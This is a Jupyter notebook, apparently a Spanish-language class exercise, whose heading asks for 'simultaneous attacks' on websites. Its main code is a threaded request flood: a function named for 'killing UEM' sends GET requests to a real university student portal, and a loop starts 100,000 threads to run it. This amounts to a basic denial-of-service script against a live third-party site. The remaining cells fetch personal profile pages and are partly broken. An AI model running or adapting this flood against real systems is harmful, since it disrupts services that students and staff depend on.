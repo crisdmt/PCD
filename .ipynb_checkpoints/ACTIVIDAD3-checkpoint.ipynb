{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8a8b914c-9b13-4b21-9df9-b17afeb8f5e2",
   "metadata": {},
   "source": [
    "# 3 prg"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c7ff4574-8793-442c-ae99-84e97f6e38f0",
   "metadata": {},
   "source": [
    "## Se solicita realizar ataques simultaneos a los siguientes sitios web"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55bfaba7-b2b5-4943-9855-61d9c774b8c5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os, platform, requests, json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bcbdb50e-b2c2-44a1-81f3-8df55f106e10",
   "metadata": {},
   "outputs": [],
   "source": [
    "numero_de_veces_hasta_matar_uem = 100000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "564a042e-fe75-4fd7-8cbd-ba17f3f6132e",
   "metadata": {},
   "outputs": [],
   "source": [
    "url_=\"https://github.com/sukuzhanay\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1507c8ba-c2ed-4334-9d88-77141768c6ac",
   "metadata": {},
   "source": [
    "## Http codes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "58629892-9618-4572-ae4c-51bcc294de2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython import display"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ad620af-cac0-4637-94a5-148a457427c9",
   "metadata": {},
   "outputs": [],
   "source": [
    "display.Image(\"statuscode.jpg\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fe1d9b8-bed2-4470-afce-50c1fda663da",
   "metadata": {},
   "outputs": [],
   "source": [
    "url_=\"https://portaldelestudiante.universidadeuropea.es/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "02f41767-465d-4098-bb58-2d187f7a2438",
   "metadata": {},
   "outputs": [],
   "source": [
    "ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aafa8b6b-0f35-4b1c-aa57-ca4c20612e8e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_uem():\n",
    "    print(requests.get(url_))\n",
    "    threading.current_thread()\n",
    "    \n",
    "    \n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78c2408b-b5a0-4a58-a2b2-29a25fe1f3a6",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(numero_de_veces_hasta_matar_uem):\n",
    "    threading.Thread(target=matar_uem).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cbb266e1-27aa-4726-8868-31df6ec44d96",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf1a9e45-dbc7-49b2-8522-947c27a7c79e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2be83c6c-7f8c-4767-95fb-1d42b603bb6e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5f30e59-80b1-4965-aa8a-eaee4cf77e46",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_=requests.get(\"https://rpubs.com/christian_sucuzhanay\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd3cd3d6-8eb2-43c0-8685-c10840fc167c",
   "metadata": {},
   "outputs": [],
   "source": [
    "html=res_.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f682606-4d5c-4ee8-a227-132a77548701",
   "metadata": {},
   "outputs": [],
   "source": [
    "html.json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f6b2fbc5-0f3b-4524-b419-80afb3e89f4d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
